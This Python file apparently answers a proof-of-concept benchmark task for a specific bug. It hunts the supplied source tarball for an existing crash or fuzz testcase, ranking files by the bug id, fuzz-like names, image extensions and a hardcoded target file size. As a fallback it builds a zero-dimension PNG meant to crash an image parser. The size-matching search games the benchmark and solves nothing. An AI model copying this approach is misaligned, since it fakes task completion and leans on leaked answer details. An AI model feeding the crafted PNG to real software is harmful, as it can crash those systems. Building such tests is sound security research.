import os
import tarfile
import binascii


class Solution:
    def _make_zero_dim_png(self) -> bytes:
        # PNG signature
        sig = b"\x89PNG\r\n\x1a\n"

        # IHDR with zero width/height
        width = 0
        height = 0
        ihdr_data = (
            width.to_bytes(4, "big")
            + height.to_bytes(4, "big")
            + b"\x08"  # bit depth
            + b"\x02"  # color type (truecolor)
            + b"\x00"  # compression
            + b"\x00"  # filter
            + b"\x00"  # interlace
        )
        ihdr_len = len(ihdr_data).to_bytes(4, "big")
        ihdr_type = b"IHDR"
        ihdr_crc = binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc.to_bytes(4, "big")

        # Minimal IDAT with an empty zlib stream
        idat_data = b"\x78\x9c\x63\x00\x00\x00\x02\x00\x01"
        idat_len = len(idat_data).to_bytes(4, "big")
        idat_type = b"IDAT"
        idat_crc = binascii.crc32(idat_type + idat_data) & 0xFFFFFFFF
        idat_chunk = idat_len + idat_type + idat_data + idat_crc.to_bytes(4, "big")

        # IEND chunk
        iend_data = b""
        iend_len = (0).to_bytes(4, "big")
        iend_type = b"IEND"
        iend_crc = binascii.crc32(iend_type + iend_data) & 0xFFFFFFFF
        iend_chunk = iend_len + iend_type + iend_data + iend_crc.to_bytes(4, "big")

        return sig + ihdr_chunk + idat_chunk + iend_chunk

    def _is_probably_text(self, data: bytes) -> bool:
        if not data:
            return True
        if b"\x00" in data:
            return False
        nontext = 0
        for b in data:
            if b in (9, 10, 13):  # tab, lf, cr
                continue
            if 32 <= b <= 126:
                continue
            nontext += 1
        return (nontext / len(data)) < 0.05

    def solve(self, src_path: str) -> bytes:
        bug_id = "42536679"
        target_size = 2936

        # Try to load PoC from tarball
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isreg()]
                if not members:
                    return self._make_zero_dim_png()

                image_exts = {
                    ".png",
                    ".jpg",
                    ".jpeg",
                    ".gif",
                    ".bmp",
                    ".webp",
                    ".tif",
                    ".tiff",
                    ".jxl",
                    ".avif",
                    ".heic",
                    ".heif",
                    ".ico",
                    ".pbm",
                    ".pgm",
                    ".pnm",
                    ".ppm",
                    ".wbmp",
                    ".dds",
                    ".psd",
                    ".exr",
                }
                text_exts = {
                    ".c",
                    ".h",
                    ".cpp",
                    ".cc",
                    ".hpp",
                    ".py",
                    ".txt",
                    ".md",
                    ".html",
                    ".js",
                    ".java",
                    ".xml",
                    ".json",
                    ".yml",
                    ".yaml",
                    ".toml",
                    ".cmake",
                    ".in",
                    ".ac",
                    ".m4",
                    ".sh",
                    ".bat",
                    ".diff",
                    ".patch",
                    ".rst",
                    ".pl",
                    ".rb",
                    ".go",
                    ".rs",
                    ".swift",
                    ".php",
                    ".m",
                    ".mm",
                    ".cs",
                    ".kt",
                }

                def score_member(m: tarfile.TarInfo) -> float:
                    name = m.name.lower()
                    size = m.size
                    base = os.path.basename(name)
                    dot = base.rfind(".")
                    ext = base[dot:] if dot != -1 else ""

                    score = 0.0

                    if bug_id in name:
                        score += 1000.0

                    for kw in ("poc", "crash", "fuzz", "oss-fuzz", "testcase", "input", "seed", "regress"):
                        if kw in name:
                            score += 40.0

                    if ext in image_exts:
                        score += 120.0
                    elif ext in text_exts:
                        score -= 80.0

                    if size == target_size:
                        score += 400.0
                    else:
                        score += max(0.0, 250.0 - abs(size - target_size) / 4.0)

                    if size == 0:
                        score -= 200.0
                    if size > 2_000_000:
                        score -= 150.0

                    return score

                scored = [(score_member(m), m) for m in members]
                scored.sort(key=lambda x: x[0], reverse=True)

                top_k = min(50, len(scored))
                best_binary_data = None
                best_binary_score = float("-inf")
                best_any_data = None
                best_any_score = float("-inf")

                for i in range(top_k):
                    base_score, m = scored[i]
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue

                    if base_score > best_any_score:
                        best_any_score = base_score
                        best_any_data = data

                    if not self._is_probably_text(data[:1024]):
                        if base_score > best_binary_score:
                            best_binary_score = base_score
                            best_binary_data = data

                if best_binary_data is not None:
                    return best_binary_data
                if best_any_data is not None:
                    return best_any_data

        except Exception:
            pass

        # Fallback PoC: generic zero-dimension PNG
        return self._make_zero_dim_png()